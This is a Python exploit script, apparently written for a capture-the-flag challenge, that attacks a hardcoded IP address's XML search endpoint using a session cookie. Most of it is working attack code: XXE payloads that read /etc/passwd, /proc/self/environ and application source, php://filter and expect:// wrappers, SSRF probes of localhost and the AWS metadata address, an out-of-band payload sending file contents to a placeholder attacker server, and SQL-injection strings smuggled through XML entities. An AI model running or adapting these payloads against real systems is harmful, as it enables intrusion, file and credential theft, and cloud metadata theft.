#!/usr/bin/python3
"""
XXE Exploitation Script for CTF Challenge

Endpoint: POST /search
Content-Type: application/xml

Known Behavior:
1. Normal request with <term>TES</term> returns:
   {
     "results": [
       {"id": 3, "title": "Edogawa Conan"},
       {"id": 2, "title": "Ran Mouri"},
       {"id": 1, "title": "Ai Haibara"}
     ]
   }

2. Request with <term>'</term> (single quote) causes SQL error:
   Error: SyntaxError: Unexpected token 'Q', "Query too "... is not valid JSON
   
   This indicates:
   - XML is parsed and <term> value is extracted
   - Value is used directly in SQL query (SQL injection vulnerability)
   - Error message leaks SQL query information
   
3. Exploitation strategy:
   - Use XXE to read files (flag.txt, etc.)
   - Combine XXE with SQL injection (XXE entity content injected into SQL)
   - Use XXE to read database files or config files
"""

import requests
import base64

ip = '157.10.160.65'
port = 8088

url = f"http://{ip}:{port}"
session_cookie = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiInIE9SIDE9MSAtLSJ9.aRhQtA.Swo36Nhv3leVGEAXoFCxM0u3tPA"

def send_xxe_payload(xml_payload, timeout=30):
    """Send XXE payload to /search endpoint"""
    headers = {
        'Host': f'{ip}:{port}',
        'Content-Type': 'application/xml',
        'Accept': '*/*',
        'Origin': f'http://{ip}:{port}',
        'Referer': f'http://{ip}:{port}/dashboard',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Cookie': f'session={session_cookie}',
        'Connection': 'keep-alive'
    }
    
    try:
        response = requests.post(
            f'{url}/search',
            data=xml_payload,
            headers=headers,
            timeout=timeout
        )
        return response
    except requests.exceptions.Timeout:
        print(f"    [!] Request timed out (might indicate XXE is being processed)")
        return None
    except Exception as e:
        print(f"    Error: {e}")
        return None

def test_basic_request():
    """Test basic request first to see if endpoint works"""
    print("[*] Testing basic request (no XXE)...")
    xml_payload = '''<!DOCTYPE search [ ]>
<search>
  <term>TES</term>
</search>'''
    
    response = send_xxe_payload(xml_payload, timeout=5)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")
        print(f"[+] Headers: {dict(response.headers)}")
        
        # Expected normal response:
        # {
        #   "results": [
        #     {"id": 3, "title": "Edogawa Conan"},
        #     {"id": 2, "title": "Ran Mouri"},
        #     {"id": 1, "title": "Ai Haibara"}
        #   ]
        # }
        return True
    else:
        print("[!] Basic request failed or timed out")
        return False

def test_sql_injection_error():
    """Test SQL injection error - single quote in term causes SQL error"""
    print("\n[*] Testing SQL injection error (single quote)...")
    print("[*] Expected: Error: SyntaxError: Unexpected token 'Q', \"Query too \"... is not valid JSON")
    
    xml_payload = '''<!DOCTYPE search [ ]>
<search>
  <term>'</term>
</search>'''
    
    response = send_xxe_payload(xml_payload, timeout=5)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text}")
        
        # This error suggests:
        # 1. XML is parsed and <term> value is extracted
        # 2. Value is used in SQL query (vulnerable to SQL injection)
        # 3. Single quote breaks SQL query
        # 4. Error message leaks information about SQL query
        if "Query too" in response.text or "SyntaxError" in response.text:
            print("[!] SQL injection vulnerability confirmed!")
            print("[!] The <term> value is being used in a SQL query")
            print("[!] We can combine XXE with SQL injection")
        return True
    else:
        print("[!] Request failed or timed out")
        return False

def analyze_response(response_text):
    """Analyze response for potential flag or interesting data"""
    if not response_text:
        return False
    
    import json
    import re
    
    # Try to parse as JSON
    try:
        data = json.loads(response_text)
        print(f"[*] Response is valid JSON: {data}")
        # Check all values in JSON
        def check_dict(d, path=""):
            for k, v in d.items():
                current_path = f"{path}.{k}" if path else k
                if isinstance(v, dict):
                    check_dict(v, current_path)
                elif isinstance(v, list):
                    for i, item in enumerate(v):
                        if isinstance(item, dict):
                            check_dict(item, f"{current_path}[{i}]")
                        elif isinstance(item, str) and ("flag" in item.lower() or len(item) > 50):
                            print(f"[!] Found interesting data at {current_path}[{i}]: {item[:200]}")
                elif isinstance(v, str):
                    if "flag" in v.lower() or "FLAG" in v or len(v) > 100:
                        print(f"[!] Found interesting data at {current_path}: {v[:200]}")
        check_dict(data)
    except:
        pass
    
    # Look for flag patterns
    flag_patterns = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, response_text, re.IGNORECASE)
        if matches:
            print(f"[!] Found flag pattern: {matches}")
            return True
    
    # Look for base64 encoded content
    base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
    matches = re.findall(base64_pattern, response_text)
    for match in matches[:3]:  # Check first 3 matches
        try:
            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
            if decoded and ("flag" in decoded.lower() or len(decoded) > 20):
                print(f"[!] Found base64 encoded data: {decoded[:200]}")
        except:
            pass
    
    return False

def test_basic_xxe():
    """Test basic XXE with file read"""
    print("\n[*] Testing basic XXE file read...")
    
    # Try reading common files - Python/Flask specific paths
    files_to_read = [
        '/etc/passwd',
        '/etc/hostname',
        '/proc/self/environ',
        '/proc/version',
        '/flag.txt',
        '/flag',
        './flag.txt',
        './flag',
        'flag.txt',
        'flag',
        '/app/flag.txt',
        '/app/flag',
        './app/flag.txt',
        'app/flag.txt',
        '/home/flag.txt',
        '/tmp/flag.txt',
        '../flag.txt',
        '../../flag.txt',
        '/var/www/flag.txt',
        'app.py',
        'main.py',
        'server.py',
        '/app/app.py',
        './app.py'
    ]
    
    for file_path in files_to_read:
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<search>
  <term>&xxe;</term>
</search>'''
        
        print(f"[*] Trying to read: {file_path}")
        response = send_xxe_payload(xml_payload, timeout=15)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response length: {len(response.text)}")
            print(f"[+] Response preview: {response.text[:500]}")
            
            # Analyze response for flags
            if analyze_response(response.text):
                print(f"\n[!] SUCCESS! Flag or interesting data found!")
                print(f"[!] Full response:\n{response.text}")
                return response.text
            
            # Also check if response is significantly longer than normal
            if len(response.text) > 200 and response.text != '{"results":[]}':
                print(f"[!] Unusual response length, analyzing...")
                analyze_response(response.text)
                print(f"[!] Full response:\n{response.text}")
        print()

def test_xxe_php_wrapper():
    """Test XXE with PHP wrapper for base64 encoding"""
    print("[*] Testing XXE with PHP wrapper (base64)...")
    
    files_to_read = [
        '/etc/passwd',
        '/flag.txt',
        '/flag',
        './flag.txt',
        './flag'
    ]
    
    for file_path in files_to_read:
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
]>
<search>
  <term>&xxe;</term>
</search>'''
        
        print(f"[*] Trying to read (base64): {file_path}")
        response = send_xxe_payload(xml_payload)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
            # Try to decode base64 if found
            try:
                # Look for base64 encoded content
                import re
                base64_pattern = r'[A-Za-z0-9+/]{20,}={0,2}'
                matches = re.findall(base64_pattern, response.text)
                for match in matches:
                    try:
                        decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                        if decoded and len(decoded) > 10:
                            print(f"[!] Decoded content: {decoded[:200]}")
                    except:
                        pass
            except:
                pass
        print()

def test_xxe_ssrf():
    """Test XXE for SSRF (Server-Side Request Forgery)"""
    print("[*] Testing XXE for SSRF...")
    
    targets = [
        'http://localhost/',
        'http://127.0.0.1/',
        'http://localhost:8080/',
        'file:///etc/passwd',
        'http://169.254.169.254/latest/meta-data/',  # AWS metadata
    ]
    
    for target in targets:
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "{target}">
]>
<search>
  <term>&xxe;</term>
</search>'''
        
        print(f"[*] Trying SSRF to: {target}")
        response = send_xxe_payload(xml_payload)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
        print()

def test_xxe_error_based():
    """Test error-based XXE"""
    print("[*] Testing error-based XXE...")
    
    xml_payload = '''<!DOCTYPE search [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com">
  %xxe;
]>
<search>
  <term>test</term>
</search>'''
    
    response = send_xxe_payload(xml_payload)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text}")

def test_xxe_out_of_band():
    """Test XXE out-of-band data exfiltration"""
    print("[*] Testing XXE out-of-band...")
    print("[!] Note: This requires a server you control to receive the data")
    
    # You need to replace this with your own server
    your_server = "http://your-server.com/xxe"
    
    xml_payload = f'''<!DOCTYPE search [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "{your_server}?data=%file;">
  %remote;
]>
<search>
  <term>test</term>
</search>'''
    
    print(f"[*] Payload would send data to: {your_server}")
    print("[!] Uncomment and set your_server variable to use this")

def test_xxe_parameter_entities():
    """Test XXE with parameter entities (might work when regular entities don't)"""
    print("\n[*] Testing XXE with parameter entities...")
    
    files_to_read = [
        '/etc/passwd',
        '/flag.txt',
        '/flag',
        './flag.txt',
        './flag',
        '/proc/self/environ'
    ]
    
    for file_path in files_to_read:
        # Using parameter entities
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<search>
  <term>test</term>
</search>'''
        
        print(f"[*] Trying parameter entity read: {file_path}")
        response = send_xxe_payload(xml_payload, timeout=15)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
            if "flag" in response.text.lower() or "root:" in response.text:
                print(f"[!] SUCCESS! Found data in error message!")
                print(f"[!] Full response:\n{response.text}")
                return response.text
        print()

def test_xxe_utf16():
    """Test XXE with UTF-16 encoding"""
    print("\n[*] Testing XXE with UTF-16 encoding...")
    
    xml_payload = '''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<search>
  <term>&xxe;</term>
</search>'''
    
    headers = {
        'Host': f'{ip}:{port}',
        'Content-Type': 'application/xml; charset=UTF-16',
        'Accept': '*/*',
        'Origin': f'http://{ip}:{port}',
        'Referer': f'http://{ip}:{port}/dashboard',
        'Cookie': f'session={session_cookie}',
        'Connection': 'keep-alive'
    }
    
    # Encode payload as UTF-16
    try:
        payload_utf16 = xml_payload.encode('utf-16')
        response = requests.post(
            f'{url}/search',
            data=payload_utf16,
            headers=headers,
            timeout=15
        )
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
    except Exception as e:
        print(f"    Error: {e}")

def test_xxe_expect():
    """Test XXE with expect:// wrapper (if PHP)"""
    print("\n[*] Testing XXE with expect:// wrapper...")
    
    xml_payload = '''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<search>
  <term>&xxe;</term>
</search>'''
    
    print("[*] Trying expect://id")
    response = send_xxe_payload(xml_payload, timeout=15)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")

def test_xxe_data_wrapper():
    """Test XXE with data:// wrapper"""
    print("\n[*] Testing XXE with data:// wrapper...")
    
    xml_payload = '''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">
]>
<search>
  <term>&xxe;</term>
</search>'''
    
    response = send_xxe_payload(xml_payload, timeout=10)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")

def test_xxe_with_sql_injection():
    """Test combining XXE with SQL injection - use XXE entity in SQL payload"""
    print("\n[*] Testing XXE combined with SQL injection...")
    print("[*] Since <term> is used in SQL query, we can inject SQL via XXE entities")
    
    # Try to use XXE to read file and inject it as SQL payload
    # This might cause SQL injection if the file content contains SQL characters
    files_to_try = [
        '/etc/passwd',
        '/flag.txt',
        '/flag',
        './flag.txt',
        './flag',
        '/proc/self/environ'
    ]
    
    for file_path in files_to_try:
        # Use XXE to read file, which will be inserted into SQL query
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<search>
  <term>&xxe;</term>
</search>'''
        
        print(f"[*] Trying XXE read + SQL injection: {file_path}")
        response = send_xxe_payload(xml_payload, timeout=15)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:500]}")
            
            # Check if we got file content in error or response
            if "root:" in response.text or "flag" in response.text.lower():
                print(f"[!] SUCCESS! Found file content!")
                print(f"[!] Full response:\n{response.text}")
                return response.text
        print()

def test_sql_injection_payloads():
    """Test SQL injection payloads using XXE entities"""
    print("\n[*] Testing SQL injection payloads via XXE...")
    
    # SQL injection payloads that might work
    sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "') OR ('1'='1",
    ]
    
    for sql_payload in sql_payloads:
        # Create XXE entity with SQL payload
        xml_payload = f'''<!DOCTYPE search [
  <!ENTITY sqli "{sql_payload}">
]>
<search>
  <term>&sqli;</term>
</search>'''
        
        print(f"[*] Trying SQL injection: {sql_payload[:30]}...")
        response = send_xxe_payload(xml_payload, timeout=10)
        if response:
            print(f"[+] Status: {response.status_code}")
            print(f"[+] Response: {response.text[:300]}")
            
            # Check if we got more results or different behavior
            if len(response.text) > 200:
                print(f"[!] Unusual response length, might be successful injection!")
                print(f"[!] Full response:\n{response.text}")
        print()

def test_custom_payload(file_path):
    """Test a custom XXE payload with specified file path"""
    print(f"\n[*] Testing custom XXE payload for: {file_path}")
    
    xml_payload = f'''<!DOCTYPE search [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<search>
  <term>&xxe;</term>
</search>'''
    
    print(f"[*] Payload:\n{xml_payload}\n")
    response = send_xxe_payload(xml_payload, timeout=20)
    if response:
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response length: {len(response.text)}")
        print(f"[+] Full response:\n{response.text}")
        return response.text
    else:
        print("[!] No response or timeout")
        return None

if __name__ == '__main__':
    print("=" * 60)
    print("XXE Exploitation Script for CTF Challenge")
    print("=" * 60)
    print()
    
    # Test 0: Basic request first
    if not test_basic_request():
        print("\n[!] Basic request failed. Check connection and session cookie.")
        exit(1)
    
    # Test 0.5: SQL injection error test
    test_sql_injection_error()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 1: Basic XXE file read
    result = test_basic_xxe()
    if result and ("flag" in result.lower() or "FLAG" in result or "root:" in result):
        print("\n[!] Found flag or interesting data!")
        exit(0)
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 1.5: XXE combined with SQL injection
    result = test_xxe_with_sql_injection()
    if result and ("flag" in result.lower() or "FLAG" in result or "root:" in result):
        print("\n[!] Found flag or interesting data!")
        exit(0)
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 1.6: SQL injection payloads via XXE
    test_sql_injection_payloads()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 2: PHP wrapper
    test_xxe_php_wrapper()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 3: Data wrapper
    test_xxe_data_wrapper()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 4: Expect wrapper
    test_xxe_expect()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 5: SSRF
    test_xxe_ssrf()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 6: Parameter entities
    test_xxe_parameter_entities()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 7: UTF-16 encoding
    test_xxe_utf16()
    
    print("\n" + "=" * 60 + "\n")
    
    # Test 8: Error-based
    test_xxe_error_based()
    
    print("\n" + "=" * 60)
    print("[*] All tests completed!")
    print("[*] If no flag found, try:")
    print("    1. Check response headers for any leaked information")
    print("    2. Try different file paths (check application structure)")
    print("    3. Use out-of-band exfiltration with your own server")
    print("    4. Check for XXE in error messages")
    print("    5. Try parameter entity injection for blind XXE")
    print("    6. Manually test specific payloads using test_custom_payload() function")
    print("    7. The <term> value is used in SQL query - exploit SQL injection via XXE")
